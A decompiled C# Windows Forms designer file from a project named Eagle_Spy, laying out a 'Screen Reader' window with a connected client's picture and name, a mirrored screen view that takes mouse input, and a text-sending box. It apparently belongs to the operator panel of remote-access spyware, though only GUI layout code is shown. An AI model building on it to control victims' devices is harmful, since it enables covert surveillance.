namespace Eagle_Spy
{
	// Token: 0x020000A2 RID: 162
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class ScreenReaderV2 : global::System.Windows.Forms.Form
	{
		// Token: 0x06000870 RID: 2160 RVA: 0x000D0618 File Offset: 0x000CE818
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000871 RID: 2161 RVA: 0x000D0658 File Offset: 0x000CE858
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.activetext = new global::System.Windows.Forms.Label();
			this.ctrlpanel = new global::System.Windows.Forms.Panel();
			this.DrakeUIButtonIcon1 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.DrakeUIButtonIcon4 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.DrakeUIButtonIcon3 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.presstimer = new global::System.Windows.Forms.Timer(this.components);
			this.DrakeUIToolTip1 = new global::DrakeUI.Framework.DrakeUIToolTip(this.components);
			this.savetimer = new global::System.Windows.Forms.Timer(this.components);
			this.Timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.clinameinfo = new global::System.Windows.Forms.Label();
			this.ClientPic = new global::System.Windows.Forms.PictureBox();
			this.viewpic = new global::System.Windows.Forms.PictureBox();
			this.textsend = new global::Guna.UI2.WinForms.Guna2TextBox();
			this.DrakeUILabel1 = new global::DrakeUI.Framework.DrakeUILabel();
			this.Enterbutton = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.Button7 = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.Button6 = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.Button5 = new global::DrakeUI.Framework.DrakeUIAvatar();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.ctrlpanel.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.viewpic).BeginInit();
			base.SuspendLayout();
			this.activetext.Font = new global::System.Drawing.Font("Calibri", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.activetext.ForeColor = global::System.Drawing.Color.Lime;
			this.activetext.Location = new global::System.Drawing.Point(134, 31);
			this.activetext.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.activetext.Name = "activetext";
			this.activetext.Size = new global::System.Drawing.Size(216, 23);
			this.activetext.TabIndex = 24;
			this.activetext.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.ctrlpanel.BackColor = global::System.Drawing.Color.Black;
			this.ctrlpanel.Controls.Add(this.DrakeUIButtonIcon1);
			this.ctrlpanel.Controls.Add(this.DrakeUIButtonIcon4);
			this.ctrlpanel.Location = new global::System.Drawing.Point(237, 557);
			this.ctrlpanel.Name = "ctrlpanel";
			this.ctrlpanel.Size = new global::System.Drawing.Size(36, 30);
			this.ctrlpanel.TabIndex = 2;
			this.DrakeUIButtonIcon1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon1.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon1.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon1.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon1.FillSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon1.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.DrakeUIButtonIcon1.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon1.ForePressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon1.Location = new global::System.Drawing.Point(129, 0);
			this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
			this.DrakeUIButtonIcon1.Radius = 10;
			this.DrakeUIButtonIcon1.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon1.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon1.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon1.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon1.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon1.Size = new global::System.Drawing.Size(57, 30);
			this.DrakeUIButtonIcon1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon1.Symbol = 57353;
			this.DrakeUIButtonIcon1.TabIndex = 22;
			this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon1, "Home");
			this.DrakeUIButtonIcon1.Click += new global::System.EventHandler(this.DrakeUIButtonIcon1_Click);
			this.DrakeUIButtonIcon4.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon4.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon4.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon4.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon4.FillSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon4.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.DrakeUIButtonIcon4.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon4.ForePressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon4.IsCircle = true;
			this.DrakeUIButtonIcon4.Location = new global::System.Drawing.Point(283, 0);
			this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
			this.DrakeUIButtonIcon4.Radius = 10;
			this.DrakeUIButtonIcon4.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon4.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon4.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon4.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon4.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon4.Size = new global::System.Drawing.Size(53, 27);
			this.DrakeUIButtonIcon4.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon4.Symbol = 61524;
			this.DrakeUIButtonIcon4.TabIndex = 23;
			this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon4, "Return");
			this.DrakeUIButtonIcon4.Click += new global::System.EventHandler(this.DrakeUIButtonIcon4_Click);
			this.DrakeUIButtonIcon3.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon3.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon3.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon3.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon3.FillSelectedColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon3.Font = new global::System.Drawing.Font("Calibri", 12f);
			this.DrakeUIButtonIcon3.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon3.ForePressColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon3.Location = new global::System.Drawing.Point(117, 557);
			this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
			this.DrakeUIButtonIcon3.Radius = 10;
			this.DrakeUIButtonIcon3.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIButtonIcon3.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon3.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.Size = new global::System.Drawing.Size(101, 30);
			this.DrakeUIButtonIcon3.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon3.Symbol = 61641;
			this.DrakeUIButtonIcon3.SymbolSize = 20;
			this.DrakeUIButtonIcon3.TabIndex = 21;
			this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon3, "Recent");
			this.DrakeUIButtonIcon3.Click += new global::System.EventHandler(this.DrakeUIButtonIcon3_Click);
			this.presstimer.Interval = 1000;
			this.presstimer.Tick += new global::System.EventHandler(this.Presstimer_Tick);
			this.DrakeUIToolTip1.BackColor = global::System.Drawing.Color.Black;
			this.DrakeUIToolTip1.ForeColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.DrakeUIToolTip1.OwnerDraw = true;
			this.DrakeUIToolTip1.RectColor = global::System.Drawing.Color.FromArgb(255, 5, 17);
			this.savetimer.Interval = 1000;
			this.savetimer.Tick += new global::System.EventHandler(this.Savetimer_Tick);
			this.clinameinfo.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.clinameinfo.Font = new global::System.Drawing.Font("Calibri", 9f);
			this.clinameinfo.ForeColor = global::System.Drawing.Color.Lime;
			this.clinameinfo.Location = new global::System.Drawing.Point(51, 27);
			this.clinameinfo.Margin = new global::System.Windows.Forms.Padding(2, 0, 2, 0);
			this.clinameinfo.Name = "clinameinfo";
			this.clinameinfo.Size = new global::System.Drawing.Size(79, 24);
			this.clinameinfo.TabIndex = 12;
			this.clinameinfo.Text = "...";
			this.clinameinfo.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.ClientPic.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.ClientPic.Location = new global::System.Drawing.Point(11, 27);
			this.ClientPic.Margin = new global::System.Windows.Forms.Padding(2, 3, 2, 3);
			this.ClientPic.Name = "ClientPic";
			this.ClientPic.Size = new global::System.Drawing.Size(31, 24);
			this.ClientPic.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.ClientPic.TabIndex = 11;
			this.ClientPic.TabStop = false;
			this.viewpic.Location = new global::System.Drawing.Point(8, 56);
			this.viewpic.Margin = new global::System.Windows.Forms.Padding(2);
			this.viewpic.Name = "viewpic";
			this.viewpic.Size = new global::System.Drawing.Size(351, 605);
			this.viewpic.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.viewpic.TabIndex = 3;
			this.viewpic.TabStop = false;
			this.viewpic.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseDown);
			this.viewpic.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.Viewpic_MouseMove);
			this.viewpic.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.Viewpic_MouseUp);
			this.textsend.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.textsend.BorderColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.textsend.BorderRadius = 5;
			this.textsend.Cursor = global::System.Windows.Forms.Cursors.IBeam;
			this.textsend.DefaultText = "";
			this.textsend.DisabledState.BorderColor = global::System.Drawing.Color.FromArgb(208, 208, 208);
			this.textsend.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(226, 226, 226);
			this.textsend.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textsend.DisabledState.PlaceholderForeColor = global::System.Drawing.Color.FromArgb(138, 138, 138);
			this.textsend.FillColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			this.textsend.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.textsend.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.textsend.ForeColor = global::System.Drawing.Color.White;
			this.textsend.HoverState.BorderColor = global::System.Drawing.Color.FromArgb(94, 148, 255);
			this.textsend.Location = new global::System.Drawing.Point(23, 666);
			this.textsend.Name = "textsend";
			this.textsend.PasswordChar = '\0';
			this.textsend.PlaceholderText = "Enter text";
			this.textsend.SelectedText = "";
			this.textsend.Size = new global::System.Drawing.Size(293, 20);
			this.textsend.TabIndex = 99;
			this.DrakeUILabel1.Font = new global::System.Drawing.Font("Bahnschrift", 14.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.DrakeUILabel1.ForeColor = global::System.Drawing.Color.White;
			this.DrakeUILabel1.Location = new global::System.Drawing.Point(91, -1);
			this.DrakeUILabel1.Name = "DrakeUILabel1";
			this.DrakeUILabel1.Size = new global::System.Drawing.Size(143, 30);
			this.DrakeUILabel1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUILabel1.TabIndex = 101;
			this.DrakeUILabel1.Text = "Screen Reader";
			this.DrakeUILabel1.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.Enterbutton.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Enterbutton.FillColor = global::System.Drawing.Color.Empty;
			this.Enterbutton.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.Enterbutton.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.Enterbutton.Location = new global::System.Drawing.Point(322, 666);
			this.Enterbutton.Name = "Enterbutton";
			this.Enterbutton.Size = new global::System.Drawing.Size(28, 20);
			this.Enterbutton.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Enterbutton.Symbol = 61732;
			this.Enterbutton.SymbolSize = 25;
			this.Enterbutton.TabIndex = 104;
			this.Enterbutton.Text = "drakeUIAvatar4";
			this.Enterbutton.Click += new global::System.EventHandler(this.Enterbutton_Click);
			this.Button7.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Button7.FillColor = global::System.Drawing.Color.Empty;
			this.Button7.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.Button7.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.Button7.Location = new global::System.Drawing.Point(62, 696);
			this.Button7.Name = "Button7";
			this.Button7.Size = new global::System.Drawing.Size(28, 31);
			this.Button7.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Button7.Symbol = 57431;
			this.Button7.SymbolSize = 30;
			this.Button7.TabIndex = 107;
			this.Button7.Text = "drakeUIAvatar3";
			this.Button7.Click += new global::System.EventHandler(this.Button7_Click);
			this.Button6.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Button6.FillColor = global::System.Drawing.Color.Empty;
			this.Button6.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.Button6.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.Button6.Location = new global::System.Drawing.Point(164, 701);
			this.Button6.Name = "Button6";
			this.Button6.Size = new global::System.Drawing.Size(22, 24);
			this.Button6.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Button6.Symbol = 61590;
			this.Button6.SymbolSize = 30;
			this.Button6.TabIndex = 106;
			this.Button6.Text = "drakeUIAvatar2";
			this.Button6.Click += new global::System.EventHandler(this.Button6_Click);
			this.Button5.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.Button5.FillColor = global::System.Drawing.Color.Empty;
			this.Button5.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.Button5.ForeColor = global::System.Drawing.Color.FromArgb(128, 128, 255);
			this.Button5.Location = new global::System.Drawing.Point(264, 698);
			this.Button5.Name = "Button5";
			this.Button5.Size = new global::System.Drawing.Size(28, 31);
			this.Button5.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.Button5.Symbol = 61751;
			this.Button5.SymbolSize = 30;
			this.Button5.TabIndex = 105;
			this.Button5.Text = "drakeUIAvatar1";
			this.Button5.Click += new global::System.EventHandler(this.Button5_Click);
			this.guna2BorderlessForm1.BorderRadius = 12;
			this.guna2BorderlessForm1.ContainerControl = this;
			this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			this.guna2BorderlessForm1.ResizeForm = false;
			this.guna2BorderlessForm1.ShadowColor = global::System.Drawing.Color.Blue;
			this.guna2BorderlessForm1.TransparentWhileDrag = true;
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.Red;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(322, 3);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(45, 29);
			this.guna2ControlBox1.TabIndex = 108;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(9, 1, 46);
			base.ClientSize = new global::System.Drawing.Size(369, 733);
			base.Controls.Add(this.guna2ControlBox1);
			base.Controls.Add(this.ClientPic);
			base.Controls.Add(this.clinameinfo);
			base.Controls.Add(this.Button7);
			base.Controls.Add(this.Enterbutton);
			base.Controls.Add(this.Button6);
			base.Controls.Add(this.Button5);
			base.Controls.Add(this.DrakeUILabel1);
			base.Controls.Add(this.textsend);
			base.Controls.Add(this.activetext);
			base.Controls.Add(this.viewpic);
			base.Controls.Add(this.DrakeUIButtonIcon3);
			base.Controls.Add(this.ctrlpanel);
			this.ForeColor = global::System.Drawing.Color.Red;
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Margin = new global::System.Windows.Forms.Padding(2);
			base.Name = "ScreenReaderV2";
			this.Text = "Screen Reader";
			base.TopMost = true;
			base.Load += new global::System.EventHandler(this.ScreenReaderV2_Load);
			this.ctrlpanel.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.viewpic).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x040009CB RID: 2507
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040009DC RID: 2524
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("ctrlpanel")]
		internal global::System.Windows.Forms.Panel ctrlpanel;

		// Token: 0x040009DD RID: 2525
		internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon1;

		// Token: 0x040009DE RID: 2526
		internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon3;

		// Token: 0x040009DF RID: 2527
		internal global::DrakeUI.Framework.DrakeUIButtonIcon DrakeUIButtonIcon4;

		// Token: 0x040009E0 RID: 2528
		internal global::System.Windows.Forms.Timer presstimer;

		// Token: 0x040009E1 RID: 2529
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("DrakeUIToolTip1")]
		internal global::DrakeUI.Framework.DrakeUIToolTip DrakeUIToolTip1;

		// Token: 0x040009E2 RID: 2530
		internal global::System.Windows.Forms.Timer savetimer;

		// Token: 0x040009E3 RID: 2531
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("activetext")]
		internal global::System.Windows.Forms.Label activetext;

		// Token: 0x040009E4 RID: 2532
		internal global::System.Windows.Forms.PictureBox viewpic;

		// Token: 0x040009E5 RID: 2533
		internal global::System.Windows.Forms.Timer Timer1;

		// Token: 0x040009E6 RID: 2534
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("clinameinfo")]
		internal global::System.Windows.Forms.Label clinameinfo;

		// Token: 0x040009E7 RID: 2535
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("ClientPic")]
		internal global::System.Windows.Forms.PictureBox ClientPic;

		// Token: 0x040009E8 RID: 2536
		private global::Guna.UI2.WinForms.Guna2TextBox textsend;

		// Token: 0x040009E9 RID: 2537
		internal global::DrakeUI.Framework.DrakeUILabel DrakeUILabel1;

		// Token: 0x040009EA RID: 2538
		private global::DrakeUI.Framework.DrakeUIAvatar Enterbutton;

		// Token: 0x040009EB RID: 2539
		private global::DrakeUI.Framework.DrakeUIAvatar Button7;

		// Token: 0x040009EC RID: 2540
		private global::DrakeUI.Framework.DrakeUIAvatar Button6;

		// Token: 0x040009ED RID: 2541
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		// Token: 0x040009EE RID: 2542
		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		// Token: 0x040009EF RID: 2543
		private global::DrakeUI.Framework.DrakeUIAvatar Button5;
	}
}
